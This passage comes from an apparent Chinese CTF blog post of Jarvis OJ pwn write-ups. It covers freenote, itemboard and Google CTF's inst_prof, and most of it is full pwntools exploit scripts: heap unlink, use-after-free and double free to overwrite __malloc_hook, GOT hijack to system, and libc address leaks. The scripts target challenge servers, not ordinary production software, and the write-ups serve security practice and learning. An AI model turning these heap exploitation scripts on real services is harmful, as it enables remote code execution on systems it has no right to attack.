class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">context.terminal = [&apos;terminator&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">local = 0</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">    cn = process(&quot;./freenote_x86&quot;)</span><br><span class="line">    bin = ELF(&quot;freenote_x86&quot;)</span><br><span class="line">    libc = ELF(&quot;/lib/i386-linux-gnu/libc.so.6&quot;)</span><br><span class="line">else:</span><br><span class="line">    cn = remote(&apos;pwn2.jarvisoj.com&apos;,9885)</span><br><span class="line">    bin = ELF(&quot;freenote_x86&quot;)</span><br><span class="line">    libc = ELF(&quot;libc-2.19.so&quot;)</span><br><span class="line"></span><br><span class="line">def list_post():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def add_post(length,content):</span><br><span class="line">    cn.sendline(&apos;2&apos;)</span><br><span class="line">    cn.recvuntil(&apos;Length&apos;)</span><br><span class="line">    cn.sendline(str(length))</span><br><span class="line">    cn.recvuntil(&apos;Enter&apos;)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line">def edit_post(idx,length,content):</span><br><span class="line">    cn.sendline(&apos;3&apos;)</span><br><span class="line">    cn.recvuntil(&apos;number&apos;)</span><br><span class="line">    cn.sendline(str(idx))</span><br><span class="line">    cn.recvuntil(&apos;Length&apos;)</span><br><span class="line">    cn.sendline(str(length))</span><br><span class="line">    cn.recvuntil(&apos;Enter&apos;)</span><br><span class="line">    cn.sendline(content)</span><br><span class="line"></span><br><span class="line">def del_post(idx):</span><br><span class="line">    cn.sendline(&apos;4&apos;)</span><br><span class="line">    cn.recvuntil(&apos;number&apos;)</span><br><span class="line">    cn.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">#chunk_list=0x0804A2EC</span><br><span class="line">#test=0x08048CC5</span><br><span class="line"></span><br><span class="line">#-------init-------</span><br><span class="line">for i in range(5):</span><br><span class="line">    add_post(0x80,str(i)*0x80)</span><br><span class="line"></span><br><span class="line">del_post(3)</span><br><span class="line">del_post(1)</span><br><span class="line"></span><br><span class="line">pay = &apos;0&apos;*0x80 + &apos;a&apos;*0x8</span><br><span class="line">edit_post(0,0x88,pay)</span><br><span class="line">#------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#--------leak----------</span><br><span class="line">cn.sendline(&apos;1&apos;)</span><br><span class="line">cn.recvuntil(&apos;a&apos;*0x8)</span><br><span class="line">leak_addr = u32(cn.recv(4))</span><br><span class="line">cn.recv()</span><br><span class="line">heap_base = leak_addr - 0xdb0#offset</span><br><span class="line">chunk0_addr = heap_base + 0x18</span><br><span class="line">success(&quot;leak_addr: &quot;+hex(leak_addr))</span><br><span class="line">success(&quot;heap_base: &quot;+hex(heap_base))</span><br><span class="line">success(&quot;chunk0_addr: &quot;+hex(chunk0_addr))</span><br><span class="line">#----------------------</span><br><span class="line"></span><br><span class="line">#-------unlink--------</span><br><span class="line">pay = p32(0x88) + p32(0x80) + p32(chunk0_addr-0xc) + p32(chunk0_addr-0x8) + &apos;0&apos;*(0x80-4*4)</span><br><span class="line">pay += p32(0x80) + p32(0x88+0x88)</span><br><span class="line">edit_post(0,len(pay),pay)</span><br><span class="line">del_post(1)</span><br><span class="line">#----------------------</span><br><span class="line"></span><br><span class="line">#--------leak----------</span><br><span class="line">pay = p32(2) + p32(1) + p32(0x88) + p32(chunk0_addr-0xc)</span><br><span class="line">pay += p32(1)+p32(0x4)+p32(bin.got[&apos;strtol&apos;])</span><br><span class="line">pay += &apos;\x00&apos;*(0x88-len(pay))</span><br><span class="line">edit_post(0,len(pay),pay)</span><br><span class="line">cn.sendline(&apos;1&apos;)</span><br><span class="line">cn.recvuntil(&apos;0. &apos;)</span><br><span class="line">cn.recvuntil(&apos;1. &apos;)</span><br><span class="line">strtol = cn.recvuntil(&apos;\x0a&apos;)[:-1]</span><br><span class="line">cn.recv()</span><br><span class="line">strtol = u32(strtol)</span><br><span class="line">system = strtol - libc.symbols[&apos;strtol&apos;]+libc.symbols[&apos;system&apos;]</span><br><span class="line">success(&quot;strtol: &quot;+hex(strtol))</span><br><span class="line">success(&quot;system: &quot;+hex(system))</span><br><span class="line">#----------------------</span><br><span class="line"></span><br><span class="line">#--------hijack&amp;getshell--------</span><br><span class="line">edit_post(1,4,p32(system))</span><br><span class="line">cn.sendline(&quot;$0&quot;)</span><br><span class="line">#----------------------</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br></pre></td></tr></table></figure>
<p>获得shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Your choice: $ whoami</span><br><span class="line">ctf</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<h1 id="itemboard"><a href="#itemboard" class="headerlink" title="itemboard"></a>itemboard</h1><p><em>2019.2.28</em><br><em>一个重要的洞没有注意到，因此做的很麻烦，而且或许是因为one_gadget的条件不够，将其覆盖到malloc hook之后仍然无法getshell，不过也把这个做法记录下来</em></p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>功能 add list show remove</p>
<p>程序会在初始时malloc一块内存来存放之后的指针</p>
<p>add 会malloc(0x18)，分别存放name,description,及单独的free函数的指针，之后再malloc(0x20)，存放name，然后读取用户输入size，malloc(size)</p>
<p>list 会显示所有的item的name</p>
<p>show 显示用户想要显示的item的name 及description，没有检查inuse</p>
<p>remove()按序将特定的item的三个指针依次free，但是没有清空即UAF漏洞，同时可以因此double free，但因为add remove都是三个chunk在，所以会比较麻烦</p>
<h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>因为指针也在堆地区，同时用户可以自由选择des大小，所以想办法将之前的存放指针的地址给用户，就有了一定的泄露地址能力</p>
<p>也可以想办法将指针指向free后的smallbin，也可以泄露libc</p>
<p>double free 可以因此将chunk分配到heap以外，即可以将之伪造到malloc hook之上，覆盖为one_gadget</p>
<p>思路比较简单，但是执行起来复杂度高，且最后没有成功getshell</p>
<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp 1"></a>exp 1</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">sh = process(&apos;./itemboard&apos;)</span><br><span class="line">#sh =remote(&apos;pwn2.jarvisoj.com&apos;,&apos;9887&apos;)</span><br><span class="line">elf = ELF(&apos;./itemboard&apos;)</span><br><span class="line">libc = ELF(&apos;./libc-2.19.so&apos;)</span><br><span class="line"></span><br><span class="line">def add(name,size,des):</span><br><span class="line">	sh.sendlineafter(&apos;:\n&apos;,&apos;1&apos;)</span><br><span class="line">	sh.sendlineafter(&apos;name?\n&apos;,name)</span><br><span class="line">	sh.sendlineafter(&apos;len?\n&apos;,str(size))</span><br><span class="line">	sh.sendlineafter(&apos;Description?\n&apos;,des)</span><br><span class="line"></span><br><span class="line">def list():</span><br><span class="line">	sh.sendlineafter(&apos;:\n&apos;,&apos;2&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show(idx):</span><br><span class="line">	sh.sendlineafter(&apos;:\n&apos;,&apos;3&apos;)</span><br><span class="line">	sh.sendlineafter(&apos;item?\n&apos;,str(idx))</span><br><span class="line"></span><br><span class="line">def remove(idx):</span><br><span class="line">	sh.sendlineafter(&apos;:\n&apos;,&apos;4&apos;)</span><br><span class="line">	sh.sendlineafter(&apos;item?\n&apos;,str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(&apos;a&apos;,0x20,&apos;b&apos;*0x10)</span><br><span class="line">add(&apos;c&apos;,0x20,&apos;d&apos;*0x10)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(&apos;e&apos;,0x10,&apos;f&apos;*9)</span><br><span class="line">add(&apos;h&apos;,0x100,&apos;i&apos;*9)</span><br><span class="line">add(&apos;A&apos;,0X60,&apos;A&apos;)</span><br><span class="line">add(&apos;B&apos;,0X60,&apos;B&apos;)</span><br><span class="line">add(&apos;f&apos;,0x100,&apos;g&apos;*0x90)</span><br><span class="line"></span><br><span class="line">#----------leak heap base---------------------------</span><br><span class="line">remove(1)</span><br><span class="line">remove(0)</span><br><span class="line"></span><br><span class="line">add(&apos;g&apos;,0,&apos;&apos;)</span><br><span class="line">show(1)</span><br><span class="line">sh.recvuntil(&apos;Description:&apos;)</span><br><span class="line">leak_addr = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">heap_base = leak_addr-0x560</span><br><span class="line">print &apos;heap_base: &apos;+hex(heap_base)</span><br><span class="line"></span><br><span class="line">#---------leak libc addr----------------------------</span><br><span class="line">remove(3)</span><br><span class="line">remove(0)</span><br><span class="line">add(&apos;g&apos;,9,p64(heap_base+0x690))</span><br><span class="line">show(1)</span><br><span class="line">sh.recvuntil(&apos;Name:&apos;)</span><br><span class="line">leak_addr = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">main_arena = leak_addr - 88</span><br><span class="line">libc_addr = main_arena - 0x3c4b20</span><br><span class="line">one_gadget = libc_addr + 0xea36d #0x46428 #0xe9415</span><br><span class="line">print &apos;main_arena: &apos;+hex(main_arena)</span><br><span class="line">print &apos;libc_addr: &apos;+hex(libc_addr)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#--------double free to getshell-----------------</span><br><span class="line">add(&apos;a&apos;,0x20,&apos;a&apos;)</span><br><span class="line">add(&apos;v&apos;,0x20,&apos;v&apos;)</span><br><span class="line"></span><br><span class="line">remove(4)</span><br><span class="line">remove(5)</span><br><span class="line">remove(4)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">add(&apos;a&apos;*8+p64(0x21),0x60,p64(main_arena-0x33))</span><br><span class="line">add(&apos;\x00&apos;*8,0x60,&apos;\x00&apos;)</span><br><span class="line">add(&apos;zz&apos;,0x60,&apos;kkk&apos;)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">add(&apos;AAA&apos;,0x60,&apos;c&apos;*0x13+p64(one_gadget))</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#add(&apos;a&apos;,0x100,&apos;a&apos;)</span><br><span class="line">#remove(3)</span><br><span class="line">#remove(3)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<h1 id="inst-prof"><a href="#inst-prof" class="headerlink" title="inst_prof"></a>inst_prof</h1><p>神一般的题，google ctf质量真的不一般。。。</p>
<h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>开始一个无限循环</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  if ( write(1, &quot;initializing prof...&quot;, 0x14uLL) == 20 )</span><br><span class="line">  &#123;</span><br><span class="line">    sleep(5u);</span><br><span class="line">    alarm(0x1Eu);</span><br><span class="line">    if ( write(1, &quot;ready\n&quot;, 6uLL) == 6 )</span><br><span class="line">    &#123;</span><br><span class="line">      while ( 1 )</span><br><span class="line">        do_test();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>重点do_test</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int do_test()</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *v0; // rbx</span><br><span class="line">  char v1; // al</span><br><span class="line">  unsigned __int64 v2; // r12</span><br><span class="line">  unsigned __int64 buf; // [rsp+8h] [rbp-18h]</span><br><span class="line"></span><br><span class="line">  v0 = alloc_page();</span><br><span class="line"></span><br><span class="line">  *(_QWORD *)v0 = *(_QWORD *)&amp;template;</span><br><span class="line">  v0[2] = *((_DWORD *)&amp;template + 2);</span><br><span class="line">  v1 = *(&amp;template + 14);</span><br><span class="line">  *((_WORD *)v0 + 6) = *((_WORD *)&amp;template + 6);</span><br><span class="line">  *((_BYTE *)v0 + 14) = v1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  read_inst((__int64)v0 + 5);                   // 4 byte</span><br><span class="line">  make_page_executable(v0);</span><br><span class="line"></span><br><span class="line">  v2 = __rdtsc();</span><br><span class="line">  ((void (__fastcall *)(_DWORD *))v0)(v0);      // exec</span><br><span class="line">  buf = __rdtsc() - v2;</span><br><span class="line"></span><br><span class="line">  if ( write(1, &amp;buf, 8uLL) != 8 )</span><br><span class="line">    exit(0);</span><br><span class="line">  return free_page(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> template:                               ; DATA XREF: do_test+15↑o</span><br><span class="line">.rodata:0000000000000C00                 mov     ecx, 1000h</span><br><span class="line">.rodata:0000000000000C05</span><br><span class="line">.rodata:0000000000000C05 loc_C05:                             </span><br><span class="line">.rodata:0000000000000C05                 nop</span><br><span class="line">.rodata:0000000000000C06                 nop</span><br><span class="line">.rodata:0000000000000C07                 nop</span><br><span class="line">.rodata:0000000000000C08                 nop                       &lt;-----输入的四个字节在这里</span><br><span class="line">.rodata:0000000000000C09                 sub     ecx, 1</span><br><span class="line">.rodata:0000000000000C0C                 jnz     short loc_C05</span><br><span class="line">.rodata:0000000000000C0E                 retn</span><br></pre></td></tr></table></figure>
<p>简单来说就是执行输入的四个字节0x1000次。。。。中间需要防止程序直接exit</p>
<h2 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h2><h2 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line">context.arch=&apos;amd64&apos; </span><br><span class="line">dec_r14=asm(&apos;dec r14&apos;)+asm(&apos;ret&apos;) </span><br><span class="line">inc_r14=asm(&apos;inc r14&apos;)+asm(&apos;ret&apos;) </span><br><span class="line">mov_r14_rsp=asm(&apos;mov r14,rsp&apos;)+asm(&apos;ret&apos;) </span><br><span class="line">mov_r14_rr14=asm(&apos;mov r14,[r14]&apos;)+asm(&apos;ret&apos;) </span><br><span class="line">mov_rrsp_r14=asm(&apos;mov [rsp],r14&apos;) </span><br><span class="line"></span><br><span class="line">debug=0</span><br><span class="line">if debug: </span><br><span class="line">	p=process(&apos;./inst_prof&apos;) #gdb.attach(proc.pidof(p)[0]) </span><br><span class="line">	offset=0xD691F-0x202B1 </span><br><span class="line">	context.log_level=&apos;debug&apos; </span><br><span class="line">else: </span><br><span class="line">	#p = process(&apos;./inst_prof&apos;)</span><br><span class="line">	p=remote(&apos;pwn2.jarvisoj.com&apos;, 9893) </span><br><span class="line">#	offset=0xEA36D-0x21F45 </span><br><span class="line">	offset=0x4647C-0x21F45 </span><br><span class="line">def exe(es): </span><br><span class="line">	p.send(es) </span><br><span class="line">	p.recvuntil(&apos;\x00\x00\x00&apos;) </span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;initializing prof...&apos;) </span><br><span class="line">p.recvuntil(&apos;ready&apos;) </span><br><span class="line">exe(mov_r14_rsp) </span><br><span class="line">for i in range(64): </span><br><span class="line">	exe(inc_r14) </span><br><span class="line">exe(mov_r14_rr14) </span><br><span class="line">t1=int(int(offset/0x1000)/2) </span><br><span class="line">t2=offset-t1*0x1000*2 </span><br><span class="line">add_t1=asm(&apos;add r14,%d&apos;%t1) </span><br><span class="line">print(t1) </span><br><span class="line">exe(add_t1) </span><br><span class="line">exe(add_t1) </span><br><span class="line">print(&apos;start inc!&apos;) </span><br><span class="line">print(t2) </span><br><span class="line">for i in range(t2): </span><br><span class="line">	exe(inc_r14) </span><br><span class="line">p.send(mov_rrsp_r14) </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
        </div>
        
<blockquote class="post-copyright">
    <div class="content">
        
<span class="post-time">
    最後更新時間：<time datetime="2019-03-06T09:18:24.132Z" itemprop="dateUpdated">2019-03-06 17:18:24</time>
</span><br>


        
        转载注明出处，原文地址：<a href="/2018/09/13/jarvis-oj-pwn/" target="_blank" rel="external">http://siriuswhiter.tk/2018/09/13/jarvis-oj-pwn/</a>
        
    </div>
    <footer>
        <a href="http://siriuswhiter.tk">
            <img src="/img/avatar.jpg" alt="Sirius Whiter">
            Sirius Whiter
        </a>
    </footer>
</blockquote>

        
            <div class="page-reward">
    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
</div>

            
        
        <div class="post-footer">
            
	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/heap/">heap</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/stack/">stack</a></li></ul>

            <div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2018/09/13/jarvis-oj-pwn/&title=《Jarvis OJ-pwn》 — Room of Requirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://siriuswhiter.tk/2018/09/13/jarvis-oj-pwn/&title=《Jarvis OJ-pwn》 — Room of Requirement&source=pwn菜鸡一枚" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>

        </div>
        
            


        
    </div>
    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="prev">
      <a href="/2018/09/25/radare2/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Radare2</h4>
      </a>
    </div>
  

  
    <div class="next">
      <a href="/2018/09/11/pwn-300解析-格式化字符串漏洞利用巩固/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">pwn-300-Formatting string vulnerability</h4>
      </a>
    </div>
  
</nav>


    
    
        <aside class="post-widget">
            <nav class="post-toc-wrap" id="post-toc">
                <strong>目录</strong>
                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#level4-DynELF"><span class="post-toc-number">1.</span> <span class="post-toc-text">level4 - DynELF</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#分析"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exp"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#level3-x64-64位参数传递"><span class="post-toc-number">2.</span> <span class="post-toc-text">level3_x64 - 64位参数传递</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息："><span class="post-toc-number">2.1.</span> <span class="post-toc-text">信息：</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#思路："><span class="post-toc-number">2.2.</span> <span class="post-toc-text">思路：</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exp-1"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#level5-mmap-amp-amp-mprotect"><span class="post-toc-number">3.</span> <span class="post-toc-text">level5 - mmap &amp;&amp; mprotect</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息-1"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#思路"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">思路</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exp-2"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">exp</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#level6-堆的unlink利用"><span class="post-toc-number">4.</span> <span class="post-toc-text">level6 - 堆的unlink利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#信息-2"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">信息</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#思路-有点迷"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">思路(有点迷)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exp（待参透）"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">exp（待参透）</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#itemboard"><span class="post-toc-number">5.</span> <span class="post-toc-text">itemboard</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">题目</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#分析-1"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exp-1"><span class="post-toc-number">5.3.</span> <span class="post-toc-text">exp 1</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#inst-prof"><span class="post-toc-number">6.</span> <span class="post-toc-text">inst_prof</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#题目-1"><span class="post-toc-number">6.1.</span> <span class="post-toc-text">题目</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#分析-2"><span class="post-toc-number">6.2.</span> <span class="post-toc-text">分析</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#exp-3"><span class="post-toc-number">6.3.</span> <span class="post-toc-text">exp</span></a></li></ol></li></ol>
            </nav>
            <div class="toc-bar"><div>
        </aside>
    
</article>

    <div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        请我喝奶茶呀
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
        </div>
        
        <label class="reward-toggle">
            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechat">微信</span>
                <span class="reward-toggle-label"></span>
                <span class="reward-toggle-item alipay">支付宝</span>
            </div>
        </label>
        
    </div>
</div>

    
</div>

        <footer class="footer">
    
    <div class="top">
        
    </div>
    
    <div class="bottom">
        <p>
            <span>
                Sirius Whiter &copy; 2018 - 2019
            </span>
        		
           	
            
            
            <span>
	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
            </span>
            
            
            

            
                
<span class="site-uv" title="总访客量">
    <i class="icon icon-user"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
</span>


<span class="site-pv" title="总访问量">
    <i class="icon icon-eye"></i>
    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
</span>

            
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://siriuswhiter.tk/2018/09/13/jarvis-oj-pwn/&title=《Jarvis OJ-pwn》 — Room of Requirement&pic=http://siriuswhiter.tk/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      
